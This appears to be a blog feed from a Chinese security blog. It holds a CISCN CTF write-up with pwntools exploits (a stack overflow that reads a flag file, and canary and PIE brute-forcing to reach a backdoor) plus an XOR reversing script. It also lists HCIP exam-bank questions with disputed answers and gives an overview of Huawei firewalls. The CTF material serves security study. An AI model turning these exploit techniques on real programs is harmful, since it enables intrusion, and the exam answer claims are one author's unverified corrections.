number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'./flag\x00\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="funcanary："><a href="#funcanary：" class="headerlink" title="funcanary：()"></a>funcanary：()</h4><p>简单栈溢出，只不过在栈上放了canary，分析发现存在后门函数backdoor，同时main函数是while(1)循环，这就使得我们输入canary失败时仍然能回到main函数，因此可以通过爆破泄露出canary的内容(8位canary，爆破七次)。程序开启了pie，因此需要爆破后门函数的地址,发现后三位不变，爆破倒数第四位。</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./funcanary'</span><span class="token punctuation">)</span><span class="token comment"># io = remote('', '')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn123'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>        <span class="token comment">#输入了正确的canary，返回</span>        <span class="token keyword">if</span> <span class="token string">b'have fun'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>            canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">break</span>backdoor <span class="token operator">=</span> <span class="token number">0x1229</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    addr <span class="token operator">=</span> k <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">2</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x31'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'flag&#123;'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="babyRE："><a href="#babyRE：" class="headerlink" title="babyRE："></a>babyRE：</h4><p>下载文件之后发现是Snap的程序，找到他的官网<a href="https://snap.berkeley.edu/snap/snap.html#%E5%9C%A8%E7%BA%BF%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%BA%9B%E5%8F%98%E9%87%8F%E5%92%8C%E5%87%BD%E6%95%B0%E5%91%BD%E5%90%8D%E4%B8%8D%E8%A7%84%E8%8C%83%EF%BC%8C%E5%B0%86%E5%85%B6%E8%A7%84%E8%8C%83%E5%8C%96%EF%BC%8C%E5%8F%91%E7%8E%B0">https://snap.berkeley.edu/snap/snap.html#在线导入文件，发现有些变量和函数命名不规范，将其规范化，发现</a></p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135150.png" style="zoom:67%;" /><p>此为初始化函数，相当于初始化数组，后发现</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135240.png" style="zoom: 67%;" /><p>将输入的字符第一个与前一个进行^ 操作，第二个与第一个进行^ 以此类推.</p><p>编写脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>str1 <span class="token operator">=</span> <span class="token string">'f'</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            str1 <span class="token operator">=</span> str1 <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><blockquote><p> flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DebuGGerrr-战队WRITEUP&quot;&gt;&lt;a href=&quot;#DebuGGerrr-战队WRITEUP&quot; class=&quot;headerlink&quot; title=&quot;DebuGGerrr 战队WRITEUP&quot;&gt;&lt;/a&gt;DebuGGerrr 战队WRITEUP&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/categories/CTF/"/>
    
    
    <category term="CISCN" scheme="https://shierjinghuang.github.io/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>HCIP问题汇总</title>
    <link href="https://shierjinghuang.github.io/2023/05/20/HCIP%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2023/05/20/HCIP%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</id>
    <published>2023-05-20T00:32:31.000Z</published>
    <updated>2023-05-20T13:09:11.378Z</updated>
    
    <content type="html"><![CDATA[<p><font color="red"><strong>6 .某企业大楼有大量员工，通常都在上班时在大厅开始接入到公司得WLAN网络，随着每位员工走到各自得工位过程中，每个人得移动端叶通过漫游的方式漫游到各自的网络覆盖区域。为了尽量保证每个终端IP地址是固定的，建议的做法是？ (B)</strong></font></p><pre class="line-numbers language-none"><code class="language-none">A.不配置VLAN POOL为每个移动终端配置静态的IP地址      B.配置VLAN POOL并配置Hash算法C.配置VLAN POOL并配置倾序算法 D.配置VLAN POOL任意配置算法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>6题及52题答案错误</strong>，解析：VLAN分配算法为Hash时，VLAN POOL根据STP的MAC地址进行哈希运算后的结果为stp分配业务VLAN，只要配置VLAN POOL里面的VLAN不发生变化，通常STP都会获取到固定的业务VLAN，STP重新上线时也会被优先分配到之前使用过的IP地址</p><p><strong><font color="red">17 . 配置双链路热备时,工程师配置的CAPWAP心跳检测的间隔时间为20秒,并且使能双链路备份功能,则AP检测到主链路超时进行主备切换的时间为(C)?</font></strong> </p><pre class="line-numbers language-none"><code class="language-none">A.75秒B.20秒C.60秒D.90秒<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>17题及63题答案错误</strong>，解析： 缺省情况下，CAPWAP心跳检测的间隔时间为25秒，心跳检测报文次数为6。如果开启了双链路备份功能，则缺省情况下，CAPWAP心跳检测的间隔时间为25秒，心跳检测报文次数为3。本题中时间为20秒且配置CAPWAP,故时间为60秒</p><p><strong>30及76题缺少图片可见356题，答案正确</strong></p><p><strong><font color="red">42 .在WLAN网络中使能HSB备份组时，若AP在主AC上线之后，再在备AC上离线添加AP信息，则备AC上的AP状态会显示为fault(A)</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A.TRUEB.FALSE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>42题901题980题相同，但答案不统一，应该是42题错误</strong>，解析：没啥好说的一套题目里关于这道题有两个答案也是离谱，42题答案B，901,980两题答案为A</p><p><strong>80缺少图片，82与382一致，但缺少图片，89题缺少图片，但不影响做题，93,95完全没有图片</strong></p><p><strong><font color="red">109 .USG防火墙中新建安全区域时，缺省的安全优先级是以下哪一项?</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、安全优先级是100B、安全优先级是5C、安全优先级是85D、安全优先级是50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ABCD全错，答案选E，解析：新建安全区域时，如果不设置安全优先级，则安全优先级为空 </p><p><strong><font color="red">113 .使用 default-route-advertise命令可将缺省路由通告进OSPF域内，该缺省路由属于以下哪一类LSA？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、 2类LSAB、 1类LSAC、 3类LSAD、 4类LSA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ABCD全错，答案选E，解析：这个题应该是5类LSA，四个选项中都没有….</p><p>133与525为题目使用图相同，525题有图，但是525答案错误</p><p><strong><font color="red">244 .在BGP4+中，Update报文中的MIP_REACH_NLRI属性携带的next hop network address字段内容是?</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、只能是链路本地地址B、可以只是链路本地地址C、只能是全球单播地址D、可以同时携带连路本地地址、全球单播地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>244题与12-831中同一题目答案不同：</strong>本题中答案为只能为全球单播地址，而831中同一题目答案为可以同时携带连路本地地址、全球单播地址</p><p>278,279缺少图片</p><p><strong><font color="red">308 .以下关于静态NAT的描述，错误的是哪一项？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A.使用静态NAT时，每一个私有地址有与之对应并且固定的公有地址B.使用静态NAT，在外部网络访问内部时，其报文中携带的公有地址（目的地址）也会被AT设备转换成对应的私有地址C.静态NAT私有地址和公有地址之间的关系是一对一的D.静态NAT能够对私有地址的端口号映射为公有地址的不同端口号，如私有地址的TCP23端口可以转换为公有地址的TCP-20320端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>308题错误，答案选C，但是静态NAT确实是一对一的，D项能进行端口映射的是NAPT….</p><p><strong><font color="red">338 .两台VRRP路由器组成了VRID为2的备份组，并配置虚拟IP地址为2001：1，那么该备份组的虚拟AC地址是以下哪一个？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、00-00-5E-00-01-02B、00-00-5E-00-02-01C、00-00-5E-00-02-02D、00-00-5E-00-01-01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>338题错误，题库答案为A项，但是A项错误，虚拟路由器根据虚拟路由器ID生成的MAC地址。一个虚拟路由器拥有一个虚拟MAC地址，格式为：00-00-5E-00-01-{VRID}(VRRP for IPv4)；00-00-5E-00-02-{VRID}(VRRP for IPv6)，虚拟IP地址为2001：1所以这个是IPV6地址，答案应该是00-00-5E-00-02-02</p><p><strong><font color="red">340 .以下关于OSPF特殊区域的描述，错误的是哪一项？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、Totally Stub区域的作用是允许ABR发布3类LSA缺省路由，不允许存在自治系统外部路由和区域间的路由B、NSSA区域和Stub区域的不同在于NSSA区域允许自治系统外部路由的引入，由ASBR发布7类LSA通告给本区域C、Stub区域和NSSA区域的不同在于Stub区域不允许存在明细域间路由D、Stub区域和Totally Stub区域的不同在于Stub区域允许存在明细域间路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>题库答案为B项，<strong>解析：NSSA 区域是允许引入外部路由的，但是引入外部路由只能由 ASBR 来实现，外部路由以7类lsa的形式传递 ，所以B项正确，CD两项明显矛盾， Totally Stub区域 不允许存在明细域间路由，而Stub区域和NSSA区域允许存在明细域间路由</strong>，故选择C</p><p>365 完全没图片</p><p><strong><font color="red">386 .以下哪一项不属于OSI网络管理模型？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、组织架构模型B、管理模型C、通信模型D、功能模型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>386题错误 答案应为管理模型</strong>，解析：OSI网络管理模型由四个主要的模型组成 ， 组织结构模型 ，信息模型，通信模型，功能模型</p><p>397 完全没图</p><p><font color="blue">508 不确定答案是否正确</font></p><p>513 .如图所示是一个IP报文头部,则以下说法正确的是?（）</p><p><img src="http://edu.ibossay.com/data/upload/2022/0810/15/62f35b6aee886/word/media/image13.png"></p><pre class="line-numbers language-none"><code class="language-none">A、协议号51,代表该IPHeader后的报文为AH头部B、协议号51,代表该IPHeader后的报文为AH头部C、协议号51,代表该IPHeader后的报文为AH头部D、该报文为lpsec VPN报文,并且该报文的数据部分被加密了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>513题 ABC选项相同</strong>，A项确实正确，但是BC与A相同……..</p><p><strong><font color="red">525 .如图所示，R1和R2在一个VRRP备份组中，若R1主动放弃Master角色，则R2会进行以下哪一动作？</font></strong></p><img src="http://edu.ibossay.com/data/upload/2022/0810/15/62f35b6aee886/word/media/image25.png" alt="image25.png" style="zoom: 50%;" /><pre class="line-numbers language-none"><code class="language-none">A、约0.22秒后切换为Master设备B、约0.61秒后切换为Master设备C、立即切换为Master设备 D、约3.61秒后切换为Master设备<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>当Master设备主动放弃Master地位（如Master设备退出备份组）时，</strong>会发送优先级为0的通告报文，用来使Backup设备快速切换成Master设备，而不用等到Master_Down_Interval定时器超时。这个切换的时间称为Skew time，计算方式为：（256－Backup设备的优先级）/256，单位为秒。</p><p><strong>当Master设备发生网络故障而不能发送通告报文的时候，</strong>Backup设备并不能立即知道其工作状况。等到Master_Down_Interval定时器超时后，才会认为Master设备无法正常工作，从而将状态切换为Master。其中，Master_Down_Interval定时器取值为：3×Advertisement_Interval＋Skew_time，单位为秒。</p><p><strong>本套题目中还有一道，不过那个是R1故障，应为3.61秒，题库中两题答案均为3.61，应为答案错误</strong></p><p><strong><font color="red">526 .如图所示，四台交换机已运行并配置了MSTP协议，其中SW2为Instance 20的根桥，Instance 10的备份根桥，那么在R2上通过display stp brief命令可显示以下哪一结果</font></strong></p><img src="http://edu.ibossay.com/data/upload/2022/0810/15/62f35b6aee886/word/media/image26.png" style="zoom: 50%;" /><pre class="line-numbers language-none"><code class="language-none">A、结果3B、结果2C、结果1D、结果4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**<font color=",">526题答案错误，参考答案为C结果1，应为结果2</font>**，SW2为Instance 20的根桥，故Instance 20上应全部为指定接口，仅有结果2满足条件</p><p>644及748完全没图片，672与819为相同题目，图片见819，答案没错<del>（应该）</del></p><p><strong><font color="red">703 .以下关于BGP中Originator_ID属性的描述，正确的是哪些项？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、若AS内存在多个RR.则Originator_ID属性由第一个RR创建B、Originator_ID属于公认任意属性C、当其他BGP Speaker接收到这条路由的时候，将比较收到的Originator_ID和本地的Router ID.如果两个ID相同，BGP Speaker会忽略掉这条路由，不做处理D、当一条路由第一次被RR反射的时候，RR将Originator_ID属性加入这条路由、标识这条路由的发起路由器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>答案CD，但703题A项也正确符合定义….</p><p><strong>719题 .ACE…..</strong></p><p><strong><font color="red">792 .下面对于DR/BDR的理解,错误的是:</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、DR other监听的网络地址为2240.0.6B、在广播网络中,必须选举DR和BDR.没有DR或BDR中的任何一个,广播网络都不能正常工作C、DR other监听的组播地址力224.0.0.5D、所有DR other只与DR和BDR建立邻接关系<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>题目792与816题干相同，选项不同，792题选项为邻接关系，816题为邻居关系，题库给的答案均为ABD,但是 所有的DR other路由器均只与DR和BDR建立邻接关系，DR other间不建立全毗邻邻接关系，答案应为792-AB与816-ABD</strong></p><p><font color="blue">867与946 这个题干跟定义有一定矛盾？ <del>最短路径树SPT（Short Path Tree）是网络的源点到所有结点的最短路径构成的树</del></font></p><p>1109完全没图，以及填空中包括1129,1131,1138,1139,1140,1142,1144,1145,1161,1163,1167,1170,1174,1175,1177,1178总计16道题目缺少图片</p><h3><center>HCIP-Datacom-AD H12-831</center></h3>**<font color="blue">23 .BGP4+中为了发布IPv6路由,Update中新增了什么字段</font>**<pre class="line-numbers language-none"><code class="language-none">A、一个新的NLRI类型,IPv6_NLR,其中携带IPv6 NLRl prefix length和IPv6 NLRl prefixB、一个新的路径属性:MP_UNREACH_NLRlC、 一个新的路径属性:MP_REACH_NLRID、 —个新的路径属性:IPv6_REACH_NLRI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本题可能需要多选，BGP4+为支持IPv6新增了2字段，MP_REACH_NLRI字段和MP_UNREACH_NLRI字段，此题我觉得选择BC</p><p><strong><font color="red">123 .通过SSH终端查看debug 输出的过程中，弹出的信息非常多，下列哪些操作能够使Monitor 终端不再弹出debug消息？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、退出当前Monitor 界面，重新SSH登录设备打开新的Monitor界面B、打开记事本，输入undo debugging all 复制该行命令粘贴到Monitor 界面C、打开记事本，输入undo terminal monitor，复制该行命令；粘贴到Monitor界面D、打开记事本，输入undo terminal debugging，复制该行命令，粘贴到Monitor 界面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>123，127，172，176，272，289六个题一样的题干，不一样的答案，三个单选均单选C项，多选题的三道则都是选择了其中三项……</p><p><strong>205题，230题，452题，462，463，487题不对图</strong></p><p>225 题BCD三项选项一致，答案单选D</p><p><font color="red">393，405，428，440四个多选题干和选项互相矛盾，个人理解四个全错</font></p><p><strong><font color="red">511 .同一台路由器的不同ISIS进程之间链路状态值息就认是隔离的 </font></strong></p><blockquote><p>511，559，585 三道一模一样的判断，两道认为答案正确两道认为答案错误</p></blockquote><p><strong><font color="blue">351，391，426题干不完整</font></strong></p><p>以及 填空统一没图 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;font color=&quot;red&quot;&gt;&lt;strong&gt;6 .某企业大楼有大量员工，通常都在上班时在大厅开始接入到公司得WLAN网络，随着每位员工走到各自得工位过程中，每个人得移动端叶通过漫游的方式漫游到各自的网络覆盖区域。为了尽量保证每个终端IP地址是固定的，建议的做法是？ </summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
  </entry>
  
  <entry>
    <title>华为防火墙安全技术概要</title>
    <link href="https://shierjinghuang.github.io/2023/04/16/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/"/>
    <id>https://shierjinghuang.github.io/2023/04/16/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/</id>
    <published>2023-04-16T08:32:31.000Z</published>
    <updated>2023-04-18T06:42:23.558Z</updated>
    
    <content type="html"><![CDATA[<h2 id="华为防火墙技术概述"><a href="#华为防火墙技术概述" class="headerlink" title="华为防火墙技术概述"></a>华为防火墙技术概述</h2><p>[TOC]</p><h3 id="防火墙概述"><a href="#防火墙概述" class="headerlink" title="防火墙概述"></a>防火墙概述</h3><blockquote><p><font color="blue">防火墙是一种安全设备。用于保护一个网络区域免受来自另一个网络区域的攻击和入侵，通常被应用于网络边界</font></p></blockquote><ul><li><p>防火墙根据设备形态分为，<strong>框式防火墙</strong>、<strong>盒式防火墙</strong>和<strong>软件防火墙</strong></p></li><li><p><font color="FF6300">防火墙作用是<strong>流量控制</strong>和<strong>安全防护</strong>，<strong>区分和隔离不同安全区域</strong></font></p></li></ul><p>防火墙的转发流程比路由器复杂。以框式设备为例，硬件上除了接口、LPU  <code>Line Processing Unit</code>、交换网板等外，防火墙还特有SPU Service Processing Unit，用于实现防火墙的安全功能</p><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/防火墙转发流程.png" style="zoom: 50%;" /><center>防火墙转发流程</center>#### 防火墙的典型应用场景<img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/应用场景.png" style="zoom: 33%;" /><center>四种不同场景下的防火墙应用</center>>DMZ非军事区 Demilitarized Zone,是介于严格的军事管制区和松散的公共区域之间的一种有着部分管制的区域。防火墙设备借用了这一术语，指代一个逻辑上和物理上都与内部网络和外部网络分离的安全区域，在企业中一般用于服务器的放置。<blockquote><p>数据中心网络一般采用Spine-Leaf架构。Spine为骨干节点负责流量高速转发，Leaf为叶子节点负责服务器、防火墙或其他设备接入。Spine-Leaf之间全三层互联</p></blockquote><h4 id="防火墙介绍："><a href="#防火墙介绍：" class="headerlink" title="防火墙介绍："></a>防火墙介绍：</h4><ul><li>防火墙从包过滤防火墙发展起经历了状态检测、统一威胁管理、NGFW等到AI防火墙，有以下特点：<ul><li>访问控制越来越精细</li><li>防护能力越来越强</li><li>性能越来越高</li></ul></li></ul><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/防火墙发展历程.png" style="zoom: 33%;" /><h5 id="包过滤防火墙"><a href="#包过滤防火墙" class="headerlink" title="包过滤防火墙"></a>包过滤防火墙</h5><p><font color="FF3300">包过滤是指基于<strong>五元组</strong>对每个数据包进行检测，根据配置的安全策略转发或丢弃数据包</font></p><p>包过滤防火墙的基本原理是：通过配置<strong>访问控制列表</strong>（Access Control List，ACL）实施数据包的过滤</p><ul><li><p>包过滤防火墙主要基于数据包中的源/目的IP地址、源/目的端口号、IP 标识和报文传递的方向等信息</p></li><li><p>包过滤防火墙的设计简单，非常易于实现，而且价格便宜</p></li><li><p>包过滤防火墙的缺点主要表现以下几点：</p><ul><li>随着ACL复杂度和长度的增加，其过滤性能呈指数下降</li><li>静态的ACL规则难以适应动态的安全要求</li><li>包过滤不检查会话状态也不分析数据，这很容易让黑客蒙混过关。例如，攻击者可以使用假冒地址进行欺骗，通过把自己主机IP地址设成一个合法主机IP地址，就能很轻易地通过报文过滤器。</li></ul></li></ul><h5 id="状态检测防火墙"><a href="#状态检测防火墙" class="headerlink" title="状态检测防火墙"></a>状态检测防火墙</h5><ul><li><font color="FF3300">状态检测考虑报文前后的关联性，检测的是连接状态而非单个报文，状态检测防火墙就是支持状态检测功能的防火墙</font></li></ul><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/状态检查防火墙.png" style="zoom:67%;" /><p><del>NGFW也是状态检测防火墙的一种。NGFW在内容安全和处理性能有极大的提升</del>，此处存疑，下一代防火墙的定义随时代发展定义也在变化，望读者读到自行判断</p><h5 id="AI防火墙"><a href="#AI防火墙" class="headerlink" title="AI防火墙"></a>AI防火墙</h5><p>AI防火墙是结合AI技术的<del>新一代防火墙</del>它通过结合AI算法或AI芯片等多种方式，进一步提高了防火墙的安全防护能力和性能</p><blockquote><p>此处也是存有一些需要自行考证，NGFW这个定义在我本科阶段大创中以经开始尝试实现结合人工智能和状态检查技术和大数据的网<strong>络态势感知系统</strong>，AI 防火墙或许以及无法担起NGFW（下一代防火墙）的称呼，以经从学科前沿，转为可以方便接触的内容</p></blockquote><p><del>华为AI防火墙，内置的恶意文件检测引擎CDE、诱捕Sensor、APT检测引擎和探针，支持与沙箱和华为大数据分析平台CIS联动检测，打造智能防御体系</del></p><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/AI防火墙.png" style="zoom:50%;" /><h3 id="防火墙的基本概念"><a href="#防火墙的基本概念" class="headerlink" title="防火墙的基本概念"></a>防火墙的基本概念</h3><blockquote><p>安全区域 Security Zone，简称为区域 Zone，是防火墙的重要概念。防火墙大部分安全策略都基于安全区域实施</p></blockquote><p>一个安全区域是防火墙若干接口所连网络的集合，一个区域内的用户具有相同的安全属性</p><h4 id="默认安全区域"><a href="#默认安全区域" class="headerlink" title="默认安全区域"></a>默认安全区域</h4><blockquote><p>华为防火墙确认已创建四个区域，untrust、dmz、trust和local区域</p></blockquote><p>安全区域有以下特性：</p><ul><li>默认的安全区域不能删除，也不允许修改安全优先级</li><li>每个Zone都必须设置一个安全优先级Priority，值越大，则Zone的安全优先级越高</li><li>用户可根据自己的需求创建自定义的Zone</li></ul><table><thead><tr><th><strong>区域名称</strong></th><th><strong>默认安全优先级</strong></th></tr></thead><tbody><tr><td>非受信区域</td><td>低安全级别区域，优先级为5</td></tr><tr><td>非军事化区</td><td>中等安全级别区域，优先级为50</td></tr><tr><td>受信区域</td><td>较高安全级别区域，优先级为85</td></tr><tr><td>本地区域</td><td>Local区域定义的是设备本身,Local区域是最高安全级别区域，优先级为100</td></tr></tbody></table><p>防火墙默认安全区域均为小写字母，且大小写敏感，包括：</p><ul><li>非受信区域（untrust）：通常用于定义Internet等不安全的网络</li><li>非军事化区域（dmz）：通常用于定义内网服务器所在区域。因为这种设备虽然部署在内网，但是经常需要被外网访问，存在较大安全隐患，同时一般又不允许其主动访问外网，所以将其部署一个优先级比trust低，但是比untrust高的安全区域中<ul><li>DMZ（Demilitarized 